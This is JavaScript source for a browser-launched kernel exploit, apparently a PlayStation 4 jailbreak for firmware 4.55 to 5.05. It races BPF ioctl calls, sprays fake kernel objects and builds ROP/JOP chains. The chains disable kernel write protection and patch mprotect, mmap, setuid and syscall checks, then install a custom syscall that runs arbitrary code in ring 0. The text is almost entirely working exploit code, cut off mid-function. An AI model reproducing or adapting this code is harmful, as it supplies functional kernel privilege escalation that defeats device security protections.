function kernExploit() {
	try {
		var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd == (-1 >>> 0))
			throw "Failed to open first bpf device!"
		var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		
		// Write BPF programs
		var bpf_valid = p.malloc32(0x4000);
		var bpf_spray = p.malloc32(0x4000);
		var bpf_valid_u32 = bpf_valid.backing;
		
		var bpf_valid_prog = p.malloc(0x40);
		p.write8(bpf_valid_prog, 0x800 / 8)
		p.write8(bpf_valid_prog.add32(8), bpf_valid)
		
		var bpf_spray_prog = p.malloc(0x40);
		p.write8(bpf_spray_prog, 0x800 / 8)
		p.write8(bpf_spray_prog.add32(8), bpf_spray)
		
		for (var i = 0; i < 0x400;) {
			bpf_valid_u32[i++] = 6;
			bpf_valid_u32[i++] = 0;
		}
		
		var rtv = p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);
		if (rtv.low != 0)
			throw "Failed to open first bpf device!";
		
		// Spawn thread
		var spawnthread = function (name, chain) {
			var contextp = p.malloc32(0x2000);
			var contextz = contextp.backing;
			contextz[0] = 1337;
			var thread2 = new rop();
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			chain(thread2);
			p.write8(contextp, window.gadgets["ret"]);
			p.write8(contextp.add32(0x10), thread2.stackBase);
			p.syscall(324, 1);
			var retv = function () { p.fcall(window.gadgets["createThread"], window.gadgets["longjmp"], contextp, p.stringify(name)); }
			window.nogc.push(contextp);
			window.nogc.push(thread2);
			return retv;
		}
		
		var interrupt1, loop1;
		var interrupt2, loop2;
		var sock = p.syscall(97, 2, 2);
		
		// Racing thread
		var start1 = spawnthread("GottaGoFast", function (thread2) {
			interrupt1 = thread2.stackBase;
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			
			thread2.push(window.gadgets["pop rdi"]);
			thread2.push(fd);
			thread2.push(window.gadgets["pop rsi"]);
			thread2.push(0x8010427B);
			thread2.push(window.gadgets["pop rdx"]);
			thread2.push(bpf_valid_prog);
			thread2.push(window.gadgets["pop rsp"]);
			thread2.push(thread2.stackBase.add32(0x800));
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
			
			thread2.push(window.gadgets["pop rdi"]);
			var wherep = thread2.pushSymbolic();
			thread2.push(window.gadgets["pop rsi"]);
			var whatp = thread2.pushSymbolic();
			thread2.push(window.gadgets["mov [rdi], rsi"]);
			
			thread2.push(window.gadgets["pop rsp"]);
			
			loop1 = thread2.stackBase.add32(thread2.count * 8);
			thread2.push(0x41414141);
			
			thread2.finalizeSymbolic(wherep, loop1);
			thread2.finalizeSymbolic(whatp, loop1.sub32(8));
		});
		
		// start setting up chains
		var krop = new rop();
		
		var kscratch = p.malloc32(0x1000);
		var ctxp  = p.malloc32(0x1000);
		var ctxp1 = p.malloc32(0x1000);
		var ctxp2 = p.malloc32(0x1000);
		
		
		// Helper function for patching kernel
		var kpatch = function(offset, qword) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(offset);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(qword);
			krop.push(window.gadgets["mov [rax], rsi"]);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(offset, offset2) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(offset);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(offset2);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
		}
		
		var stackshift_from_retaddr = 0;
		
		p.write8(bpf_spray.add32(0x10), ctxp);     // Spray heap with the fake knote object
		p.write8(ctxp.add32(0x50), 0);             // Set knote->kn_status to 0 to detach
		p.write8(ctxp.add32(0x68), ctxp1); // Set knote->kn_fops to fake function table
		
		p.write8(ctxp1.add32(0x10), window.gadgets["jop1"]);  // Set kn_fops->f_detach to first JOP gadget
		stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
		
		p.write8(ctxp.add32(0x00), ctxp2);  // Set rdi
		p.write8(ctxp.add32(0x10), ctxp2.add32(0x08));
		p.write8(ctxp2.add32(0x7D0), window.gadgets["jop2"]); // Chain to next gadget
		
		var iterbase = ctxp2;
		
		for (var i = 0; i < 0xF; i++) {
			p.write8(iterbase, window.gadgets["jop1"]); // Chain to next gadget
			stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
			
			p.write8(iterbase.add32(0x7D0 + 0x20), window.gadgets["jop2"]); // Chain to next gadget
			
			p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
			p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
			iterbase = iterbase.add32(0x20);
		}
		
		var raxbase = iterbase;
		var rdibase = iterbase.add32(0x08);
		var memcpy = get_jmptgt(webKitBase.add32(0xF8));
		memcpy = p.read8(memcpy);
		
		p.write8(raxbase, window.gadgets["jop3"]); // Chain to next gadget
		stackshift_from_retaddr += 0x8;
		
		p.write8(rdibase.add32(0x70), window.gadgets["jop4"]); // Chain to next gadget
		stackshift_from_retaddr += 0x8;
		
		p.write8(rdibase.add32(0x18), rdibase);
		p.write8(rdibase.add32(0x08), krop.stackBase); // Sets RSI to krop stack's location
		p.write8(raxbase.add32(0x30), window.gadgets["jop_mov rbp, rsp"]); // Save RSP
		
		p.write8(rdibase, raxbase); // [rdi] = rax
		p.write8(raxbase.add32(0x420), window.gadgets["jop6"]); // Chain to next gadget
		stackshift_from_retaddr += window.gadgets_shift["stackshift_jop6"];
		
		var topofchain = stackshift_from_retaddr;
		p.write8(raxbase.add32(0x40), memcpy.add32(0x32)); // Chain to memcpy
		p.write8(rdibase.add32(0xB0), topofchain); // Write size for memcpy
		
		for (var i = 0; i < 0x1000 / 8; i++)
			p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
		
		krop.count = 0x10;
		
		p.write8(kscratch.add32(0x420), window.gadgets["pop rdi"]);
		p.write8(kscratch.add32(0x40), window.gadgets["pop rax"]);
		p.write8(kscratch.add32(0x18), kscratch);
		
		//krop.push(window.gadgets["infloop"]); // only for kexploit debug test
		
		krop.push(window.gadgets["pop rdi"]);
		krop.push(kscratch.add32(0x18));
		krop.push(window.gadgets["jop_mov rbp, rsp"]);
		
		var rboff = topofchain - krop.count * 8;
		
		krop.push(window.gadgets["jop6"]); // lea rdi, [rbp - 0x28]
		rboff += window.gadgets_shift["stackshift_jop6"];
		krop.push(window.gadgets["pop rax"]);
		krop.push(rboff);
		krop.push(window.gadgets["add rdi, rax"]);
		
		if (fwFromUA == "5.01") {
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x2FA); // 5.01-5.05
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Save context of cr0 register
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0xC54B4); // 5.01-5.05
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["jmp rax"]);
			krop.push(window.gadgets["pop rdi"]); // save cr0
			krop.push(kscratch.add32(0x10));
			
			// Disable kernel write protection for .text
			krop.push(window.gadgets["mov [rdi], rax"]); // Save cr0 register
			krop.push(window.gadgets["pop rsi"]);
			krop.push(new int64(0xFFFEFFFF, 0xFFFFFFFF)); // Flip WP bit
			krop.push(window.gadgets["and rax, rsi"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(8));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x9);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["mov rax, rdx"]);
			krop.push(window.gadgets["jmp rdi"]);
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x3609A); // 5.01-5.05
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x330));
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Patch sys_mprotect: Allow RWX mapping
			patch_mprotect = new int64(0x9090FA38, 0x90909090); // 5.01-5.05
			kpatch(0x3609A, patch_mprotect); // 5.01-5.05
			
			// Patch sys_setuid: add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			var patch_sys_setuid_offset = new int64(0xFFEE7016, 0xFFFFFFFF); // 5.01
			var patch_sys_setuid = new int64(0x000000B8, 0xC4894100); // 5.01-5.05
			kpatch(patch_sys_setuid_offset, patch_sys_setuid);
			
			// Patch amd64_syscall: syscall instruction allowed anywhere
			var patch_amd64_syscall_offset1 = new int64(0xFFE92A37, 0xFFFFFFFF); // 5.01
			var patch_amd64_syscall_offset2 = new int64(0xFFE92A55, 0xFFFFFFFF); // 5.01
			var patch_amd64_syscall_1 = new int64(0x00000000, 0x40878B49); // 5.01-5.05
			var patch_amd64_syscall_2 = new int64(0x90907DEB, 0x72909090); // 5.01-5.05
			kpatch(patch_amd64_syscall_offset1, patch_amd64_syscall_1);
			kpatch(patch_amd64_syscall_offset2, patch_amd64_syscall_2);
			
			// Patch: sys_mmap: allow RWX mapping from anywhere
			var patch_sys_mmap_offset = new int64(0xFFFCFAB4, 0xFFFFFFFF); // 5.01-5.05
			var patch_sys_mmap = new int64(0x37B64037, 0x3145C031); // 5.01-5.05
			kpatch(patch_sys_mmap_offset, patch_sys_mmap);
			
			// Patch sys_dynlib_dlsym: allow dynamic resolving from anywhere
			var patch_sys_dynlib_dlsym_1 = new int64(0x000000E9, 0x8B489000); // 5.01-5.05
			var patch_sys_dynlib_dlsym_2 = new int64(0x90C3C031, 0x90909090); // 5.01-5.05
			kpatch(0xCA3CE,  patch_sys_dynlib_dlsym_1); // 5.01-5.05
			kpatch(0x1448F4, patch_sys_dynlib_dlsym_2); // 5.01
			
			// Patch sysent entry #11: sys_kexec() custom syscall to execute code in ring0
			var patch_sys_exec_1 = new int64(0x00F0EDC4, 0); // 5.01
			var patch_sys_exec_2A = new int64(0x00F0EDCC, 0); // 5.01
			var patch_sys_exec_2B = new int64(0xFFEA5A04, 0xFFFFFFFF); // 5.01
			var patch_sys_exec_3 = new int64(0x00F0EDEC, 0); // 5.01
			var patch_sys_exec_param1 = new int64(0x02, 0);
			var patch_sys_exec_param3 = new int64(0, 1);
			kpatch(patch_sys_exec_1, patch_sys_exec_param1);
			kpatch2(patch_sys_exec_2A, patch_sys_exec_2B);
			kpatch(patch_sys_exec_3, patch_sys_exec_param3);
			
			// Enable kernel write protection for .text
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x09);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x10)); // Restore old cr0 value with WP bit set
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["jmp rdi"]);
			
		} else if (fwFromUA == "5.05") {
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x2FA);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Save context of cr0 register
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0xC54B4);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov [rdi], rax"]);
			krop.push(window.gadgets["jmp rax"]);
			krop.push(window.gadgets["pop rdi"]); // save cr0
			krop.push(kscratch.add32(0x10));
			
			// Disable kernel write protection for .text
			krop.push(window.gadgets["mov [rdi], rax"]); // Save cr0 register
			krop.push(window.gadgets["pop rsi"]);
			krop.push(new int64(0xFFFEFFFF, 0xFFFFFFFF)); // Flip WP bit
			krop.push(window.gadgets["and rax, rsi"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(8));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x9);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["mov rax, rdx"]);
			krop.push(window.gadgets["jmp rdi"]);
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x3609A);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch.add32(0x330));
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			// Patch sys_mprotect: Allow RWX mapping
			patch_mprotect = new int64(0x9090FA38, 0x90909090);
			kpatch(0x3609A, patch_mprotect);
			
			// Patch sys_setuid: add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			var patch_sys_setuid_offset = new int64(0xFFEE6F06, 0xFFFFFFFF);
			var patch_sys_setuid = new int64(0x000000B8, 0xC4894100);
			kpatch(patch_sys_setuid_offset, patch_sys_setuid);
			
			// Patch amd64_syscall: syscall instruction allowed anywhere
			var patch_amd64_syscall_offset1 = new int64(0xFFE92927, 0xFFFFFFFF);
			var patch_amd64_syscall_offset2 = new int64(0xFFE92945, 0xFFFFFFFF);
			var patch_amd64_syscall_1 = new int64(0x00000000, 0x40878B49);
			var patch_amd64_syscall_2 = new int64(0x90907DEB, 0x72909090);
			kpatch(patch_amd64_syscall_offset1, patch_amd64_syscall_1);
			kpatch(patch_amd64_syscall_offset2, patch_amd64_syscall_2);
			
			// Patch: sys_mmap: allow RWX mapping from anywhere
			var patch_sys_mmap_offset = new int64(0xFFFCFAB4, 0xFFFFFFFF);
			var patch_sys_mmap = new int64(0x37B64037, 0x3145C031);
			kpatch(patch_sys_mmap_offset, patch_sys_mmap);
			
			// Patch sys_dynlib_dlsym: allow dynamic resolving from anywhere
			var patch_sys_dynlib_dlsym_1 = new int64(0x0001C1E9, 0x8B489000);
			var patch_sys_dynlib_dlsym_2 = new int64(0x90C3C031, 0x90909090);
			kpatch(0xCA3CE,  patch_sys_dynlib_dlsym_1);
			kpatch(0x144AB4, patch_sys_dynlib_dlsym_2);
			
			// Patch sysent entry #11: sys_kexec() custom syscall to execute code in ring0
			var patch_sys_exec_1 = new int64(0x00F0ECB4, 0);
			var patch_sys_exec_2A = new int64(0x00F0ECBC, 0);
			var patch_sys_exec_2B = new int64(0xFFEA58F4, 0xFFFFFFFF);
			var patch_sys_exec_3 = new int64(0x00F0ECDC, 0);
			var patch_sys_exec_param1 = new int64(0x02, 0);
			var patch_sys_exec_param3 = new int64(0, 1);
			kpatch(patch_sys_exec_1, patch_sys_exec_param1);
			kpatch2(patch_sys_exec_2A, patch_sys_exec_2B);
			kpatch(patch_sys_exec_3, patch_sys_exec_param3);
			
			// Enable kernel write protection for .text
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x08));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x09);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch.add32(0x10)); // Restore old cr0 value with WP bit set
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["jmp rdi"]);
			
		} else if (fwFromUA == "4.74") {
			
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1E48A0); // Slide of the return ptr from kernel base
			krop.push(window.gadgets["sub rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov [rsi], rdx"]);
			
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(window.gadgets["test"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			
			
			// Disable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x283129);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(0x80040033);
			krop.push(window.gadgets["jmp rdx_more"]);
			
			// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
			var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x113B73);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kexploit_check_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch mprotect: Allow RWX (read-write-execute) mapping
			var mprotect_patch = new int64(0x9090EA38, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x397876);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(mprotect_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_mmap: Allow RWX (read-write-execute) mapping
			var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1413A4);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_mmap_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch syscall: syscall instruction allowed anywhere
			var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
			var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DD4B3);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DD4D1);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_dynlib_dlsym: Allow from anywhere
			var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
			var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3D05AE);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x686A0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Add custom sys_exec() call to execute arbitrary code as kernel
			var kernel_exec_param = new int64(0, 1);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x10349A0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x02);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rsi"])
			krop.push(0x139A2F); // jmp qword ptr [rsi],done
			krop.push(window.gadgets["pop rdi"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["add rsi, [rdi]; mov rax, rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x10349A8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x10349C8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_exec_param);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Enable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x283120);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["jmp rax"]);
			
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
		} else if (fwFromUA == "4.55") {
			
			krop.push(window.gadgets["mov rax, [rdi]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1E2640); // Slide of the return ptr from kernel base
			krop.push(window.gadgets["sub rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov [rsi], rdx"]);
			
			
			krop.push(window.gadgets["pop rax"]);
			krop.push(window.gadgets["test"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
			
			
			// Disable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x280f79);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(0x80040033);
			krop.push(window.gadgets["jmp rdx_more"]);
			
			// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
			var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x1144E3);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kexploit_check_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch mprotect: Allow RWX (read-write-execute) mapping
			var mprotect_patch = new int64(0x9090EA38, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x396A56);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(mprotect_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_mmap: Allow RWX (read-write-execute) mapping
			var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x141D14);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_mmap_patch);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch syscall: syscall instruction allowed anywhere
			var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
			var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DC603);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3DC621);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_syscall_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Patch sys_dynlib_dlsym: Allow from anywhere
			var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
			var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x3CF6FE);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch1);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x690C0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_dlsym_patch2);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Add custom sys_exec() call to execute arbitrary code as kernel
			var kernel_exec_param = new int64(0, 1);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x102b8a0);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(0x02);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rsi"])
			krop.push(0x13a39f); // jmp qword ptr [rsi],done
			krop.push(window.gadgets["pop rdi"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["add rsi, [rdi]; mov rax, rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x102b8a8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov [rax], rsi"]);
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x102b8c8);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(kernel_exec_param);
			krop.push(window.gadgets["mov [rax], rsi"]);
			
			// Enable kernel write protection
			krop.push(window.gadgets["pop rax"])
			krop.push(kscratch.add32(0x90));
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(0x280f70);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["jmp rax"]);
			
			krop.push(window.gadgets["pop rdi"]); // save address in usermode
			krop.push(kscratch);
			krop.push(window.gadgets["mov [rdi], rax"]);
			
		}
		
